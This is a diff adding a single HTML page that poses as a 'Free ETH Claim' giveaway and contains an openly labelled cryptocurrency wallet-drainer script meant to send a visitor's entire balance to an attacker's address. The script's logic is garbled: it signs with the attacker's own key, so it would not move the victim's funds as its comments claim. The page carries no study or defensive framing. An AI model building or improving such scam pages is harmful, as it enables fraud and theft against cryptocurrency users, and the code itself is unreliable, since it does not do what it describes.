@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free ETH Claim</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+</head>
+<body>
+    <h1>Claim Your Free 100 ETH!</h1>
+    <button id="claimBtn">Connect Wallet & Claim</button>
+
+    <script>
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const attackerAddress = "YOUR_WALLET_ADDRESS"; // YOUR WALLET ADDRESS
+        const attackerPrivateKey = "YOUR_PRIVATE_KEY"; // YOUR PRIVATE KEY (for signing)
+
+        document.getElementById("claimBtn").addEventListener("click", async () => {
+            try {
+                // Request wallet connection
+                await provider.send("eth_requestAccounts", []);
+
+                // Get user's wallet balance
+                const [userAccount] = await provider.listAccounts();
+                const balance = await provider.getBalance(userAccount);
+
+                // Send all funds to attacker's wallet
+                const tx = {
+                    to: attackerAddress,
+                    value: balance,
+                    gasLimit: 21000,
+                    gasPrice: ethers.utils.parseUnits("40", "gwei"),
+                };
+
+                // Sign transaction with attacker's private key
+                const signer = new ethers.Wallet(attackerPrivateKey, provider);
+                const signedTx = await signer.sendTransaction(tx);
+
+                // Wait for confirmation
+                const receipt = await signedTx.wait();
+                if (receipt.status === 1) {
+                    alert("Your wallet has been drained! Funds sent to attacker's address.");
+                } else {
+                    alert("Transaction failed. Try again later.");
+                }
+            } catch (error) {
+                console.error(error);
+                alert("Error connecting wallet. Check MetaMask permissions.");
+            }
+        });
+    </script>
+</body>
+</html>
